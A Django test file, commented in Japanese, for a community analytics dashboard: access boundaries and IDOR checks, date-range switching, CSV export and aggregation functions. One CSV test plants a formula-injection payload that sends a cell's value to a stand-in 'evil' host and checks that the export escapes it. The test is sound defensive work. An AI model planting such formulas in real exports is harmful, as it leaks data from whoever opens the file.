"""アクセス解析ダッシュボードのテスト。

権限境界、期間切替、CSV出力、集計関数の正当性を検証する。
他人の community のデータが漏洩しないことを `source_medium` の識別子で直接確認する。
"""
import csv
import io
from datetime import date, timedelta

from django.test import TestCase, Client
from django.urls import reverse
from django.utils import timezone

from community.models import Community, CommunityMember
from event.models import Event, EventDetail
from user_account.models import CustomUser

from analytics import services
from analytics.models import PageAnalytics


def _create_community(name='community-A'):
    return Community.objects.create(
        name=name,
        description='test',
        organizers=name,
        platform='PCVR',
        status='approved',
        frequency='weekly',
        start_time='22:00',
    )


def _create_event_detail(community, theme, event_date=None):
    event = Event.objects.create(
        community=community,
        date=event_date or date(2026, 4, 1),
        start_time='22:00',
    )
    return EventDetail.objects.create(
        event=event,
        theme=theme,
        h1=theme,
        contents='',
        detail_type='LT',
    )


def _make_analytics(community, *, page_path, content_type, object_id, date_, pv, source='google / organic'):
    PageAnalytics.objects.create(
        community=community,
        page_path=page_path,
        date=date_,
        source_medium=source,
        pv=pv,
        users=pv,
        sessions=pv,
        content_type=content_type,
        object_id=object_id,
    )


class DashboardViewAccessTest(TestCase):
    """ダッシュボードの権限境界を検証。"""

    def setUp(self):
        self.client = Client()
        self.community_a = _create_community('A')
        self.community_b = _create_community('B')
        self.user_a = CustomUser.objects.create_user(
            user_name='user_a', email='a@example.com', password='pass'
        )
        CommunityMember.objects.create(
            community=self.community_a,
            user=self.user_a,
            role=CommunityMember.Role.OWNER,
        )
        self.user_b = CustomUser.objects.create_user(
            user_name='user_b', email='b@example.com', password='pass'
        )
        CommunityMember.objects.create(
            community=self.community_b,
            user=self.user_b,
            role=CommunityMember.Role.OWNER,
        )
        self.url = reverse('analytics:dashboard')

        # A の records には source-A-only / B には source-B-only を入れて、識別可能にする
        ed_a = _create_event_detail(self.community_a, 'A theme')
        ed_b = _create_event_detail(self.community_b, 'B theme')
        today = timezone.localdate()
        _make_analytics(self.community_a, page_path='/community/{}/'.format(self.community_a.id),
                        content_type=PageAnalytics.ContentType.COMMUNITY,
                        object_id=self.community_a.id, date_=today, pv=10, source='source-A-only / organic')
        _make_analytics(self.community_a, page_path='/event/detail/{}/'.format(ed_a.id),
                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
                        object_id=ed_a.id, date_=today, pv=5, source='source-A-only / referral')
        _make_analytics(self.community_b, page_path='/community/{}/'.format(self.community_b.id),
                        content_type=PageAnalytics.ContentType.COMMUNITY,
                        object_id=self.community_b.id, date_=today, pv=20, source='source-B-only / organic')

    def test_unauthenticated_redirects_to_login(self):
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 302)
        self.assertIn('/account/login/', response['Location'])

    def test_member_sees_only_own_community_data(self):
        """user_a は community_a のデータのみ見え、community_b の流入元は見えない。"""
        self.client.force_login(self.user_a)
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        # context レベルで権限境界を確認（テンプレ描画よりも素直に検証可能）
        breakdown = response.context['source_breakdown']
        sources = {row['source_medium'] for row in breakdown}
        self.assertIn('source-A-only / organic', sources)
        self.assertNotIn('source-B-only / organic', sources)

    def test_member_cannot_view_other_community_by_query_param(self):
        """?community=B を指定しても user_a には B のデータが漏れない（IDOR防止）。"""
        self.client.force_login(self.user_a)
        response = self.client.get(self.url, {'community': self.community_b.id})
        self.assertEqual(response.status_code, 200)
        sources = {row['source_medium'] for row in response.context['source_breakdown']}
        # 不正な community 指定はアクセス可能な全community(=A) にフォールバック
        self.assertIn('source-A-only / organic', sources)
        self.assertNotIn('source-B-only / organic', sources)

    def test_user_without_any_community_sees_empty_state(self):
        """所属 community がないユーザーは has_access=False となる。"""
        no_member = CustomUser.objects.create_user(
            user_name='no_member', email='nm@example.com', password='pass'
        )
        self.client.force_login(no_member)
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context['has_access'])

    def test_superuser_sees_all_communities(self):
        """superuser は B のデータも見える。"""
        admin = CustomUser.objects.create_superuser(
            user_name='admin', email='admin@example.com', password='pass'
        )
        self.client.force_login(admin)
        response = self.client.get(self.url)
        sources = {row['source_medium'] for row in response.context['source_breakdown']}
        self.assertIn('source-A-only / organic', sources)
        self.assertIn('source-B-only / organic', sources)


class DashboardPeriodTest(TestCase):
    """期間切替（?days=7/30/90）を検証。"""

    def setUp(self):
        self.client = Client()
        self.community = _create_community('C')
        self.user = CustomUser.objects.create_user(
            user_name='u', email='u@example.com', password='pass'
        )
        CommunityMember.objects.create(
            community=self.community, user=self.user, role=CommunityMember.Role.OWNER,
        )
        self.client.force_login(self.user)

        today = timezone.localdate()
        # 5日前と45日前の2件
        _make_analytics(self.community, page_path='/community/c/',
                        content_type=PageAnalytics.ContentType.COMMUNITY,
                        object_id=self.community.id,
                        date_=today - timedelta(days=5), pv=100, source='recent / direct')
        _make_analytics(self.community, page_path='/community/c/',
                        content_type=PageAnalytics.ContentType.COMMUNITY,
                        object_id=self.community.id,
                        date_=today - timedelta(days=45), pv=200, source='old / referral')

    def _sources(self, response):
        return {row['source_medium'] for row in response.context['source_breakdown']}

    def test_days_7_excludes_old_data(self):
        response = self.client.get(reverse('analytics:dashboard'), {'days': 7})
        sources = self._sources(response)
        self.assertIn('recent / direct', sources)
        self.assertNotIn('old / referral', sources)

    def test_days_90_includes_old_data(self):
        response = self.client.get(reverse('analytics:dashboard'), {'days': 90})
        sources = self._sources(response)
        self.assertIn('recent / direct', sources)
        self.assertIn('old / referral', sources)

    def test_invalid_days_falls_back_to_default(self):
        """許可リスト外の days は 30 にフォールバック。"""
        response = self.client.get(reverse('analytics:dashboard'), {'days': 999})
        # 30日デフォルト = 5日前は含む、45日前は含まない
        sources = self._sources(response)
        self.assertIn('recent / direct', sources)
        self.assertNotIn('old / referral', sources)
        self.assertEqual(response.context['days'], 30)


class DashboardCsvExportTest(TestCase):
    """CSV エクスポート機能を検証。"""

    def setUp(self):
        self.client = Client()
        self.community = _create_community('D')
        self.user = CustomUser.objects.create_user(
            user_name='u', email='u@example.com', password='pass'
        )
        CommunityMember.objects.create(
            community=self.community, user=self.user, role=CommunityMember.Role.OWNER,
        )
        self.client.force_login(self.user)

        self.ed = _create_event_detail(self.community, 'CSV テスト記事', event_date=date(2026, 5, 1))
        today = timezone.localdate()
        _make_analytics(self.community, page_path=f'/event/detail/{self.ed.id}/',
                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
                        object_id=self.ed.id, date_=today, pv=42, source='google / organic')

    def test_csv_export_returns_csv_content_type(self):
        response = self.client.get(reverse('analytics:dashboard'), {'format': 'csv'})
        self.assertEqual(response.status_code, 200)
        self.assertIn('text/csv', response['Content-Type'])
        self.assertIn('attachment', response['Content-Disposition'])

    def test_csv_includes_event_detail_row(self):
        response = self.client.get(reverse('analytics:dashboard'), {'format': 'csv'})
        # utf-8-sig でデコードすれば BOM が自動除去される（テスト側で BOM 取り扱いを気にしない）
        content = response.content.decode('utf-8-sig')
        reader = csv.reader(io.StringIO(content))
        rows = list(reader)
        # 1行目: ヘッダー、以降データ
        self.assertGreater(len(rows), 1)
        header = rows[0]
        self.assertIn('タイトル', header)
        self.assertIn('PV', header)
        # データ行に記事 ID が含まれる
        ids = [row[0] for row in rows[1:]]
        self.assertIn(str(self.ed.id), ids)

    def test_csv_starts_with_utf8_bom(self):
        """Excel で文字化けしないよう UTF-8 BOM を必ず付ける（回帰防止）。"""
        response = self.client.get(reverse('analytics:dashboard'), {'format': 'csv'})
        self.assertTrue(
            response.content.startswith(b'\xef\xbb\xbf'),
            'CSV response must start with UTF-8 BOM',
        )

    def test_csv_blocks_other_community_data_by_query_param(self):
        """?format=csv&community={他人のID} でも自分の community 範囲外のデータは含まれない。"""
        # 他人の community を作成し event_detail と analytics を仕込む
        other = _create_community('OtherCommunity')
        other_ed = _create_event_detail(other, '他人の記事X', event_date=date(2026, 5, 1))
        _make_analytics(other, page_path=f'/event/detail/{other_ed.id}/',
                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
                        object_id=other_ed.id, date_=timezone.localdate(), pv=999)

        response = self.client.get(
            reverse('analytics:dashboard'),
            {'format': 'csv', 'community': other.id},
        )
        content = response.content.decode('utf-8-sig')
        # 他人 community の名前と記事タイトルは CSV に含まれない（IDOR防止）
        self.assertNotIn('OtherCommunity', content)
        self.assertNotIn('他人の記事X', content)

    def test_csv_escapes_formula_injection(self):
        """先頭が =,+,-,@ の文字列はシングルクォートで無害化される。"""
        # theme を悪意ある式に書き換え
        self.ed.theme = '=HYPERLINK("http://evil/?leak=" & A1, "click")'
        self.ed.save()

        response = self.client.get(reverse('analytics:dashboard'), {'format': 'csv'})
        content = response.content.decode('utf-8-sig')
        # シングルクォート付きで埋め込まれる（Excel で数式評価されない）
        self.assertIn("'=HYPERLINK", content)


class ServiceFunctionsTest(TestCase):
    """services.py の集計関数を直接検証。"""

    def setUp(self):
        self.community = _create_community('E')
        self.ed = _create_event_detail(self.community, 'Service テスト記事', event_date=date(2026, 5, 1))
        today = timezone.localdate()
        # 直近30日: pv 50, 前30日: pv 25 (= 100% 増)
        _make_analytics(self.community, page_path=f'/event/detail/{self.ed.id}/',
                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
                        object_id=self.ed.id, date_=today - timedelta(days=5), pv=50)
        _make_analytics(self.community, page_path=f'/event/detail/{self.ed.id}/',
                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
                        object_id=self.ed.id, date_=today - timedelta(days=45), pv=25)

    def test_get_overall_stats_calculates_change_pct(self):
        stats = services.get_overall_stats([self.community.id], days=30)
        self.assertEqual(stats['pv'], 50)
        self.assertEqual(stats['pv_prev'], 25)
        self.assertEqual(stats['pv_change_pct'], 100.0)

    def test_get_overall_stats_empty_community_returns_zeros(self):
        stats = services.get_overall_stats([], days=30)
        self.assertEqual(stats['pv'], 0)
        self.assertIsNone(stats['pv_change_pct'])

    def test_get_event_detail_breakdown_includes_metadata(self):
        rows = services.get_event_detail_breakdown([self.community.id], days=30)
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertEqual(row['event_detail_id'], self.ed.id)
        self.assertEqual(row['theme'], 'Service テスト記事')
        self.assertEqual(row['community_name'], 'E')
        self.assertEqual(row['pv'], 50)

    def test_get_event_detail_breakdown_respects_community_boundary(self):
        """他人の community_id を渡しても自分のデータは返らない。"""
        other = _create_community('Other')
        rows = services.get_event_detail_breakdown([other.id], days=30)
        self.assertEqual(rows, [])

    def test_get_post_publish_series_aligns_by_publish_date(self):
        """公開日基準で Day 0, 1, ... の PV が並ぶ。"""
        result = services.get_post_publish_series(
            [self.community.id], days_after=10, top_n=3,
        )
        self.assertEqual(result['labels'][:3], ['Day 0', 'Day 1', 'Day 2'])
        # 1記事しかないので datasets は1件以下
        self.assertLessEqual(len(result['datasets']), 1)
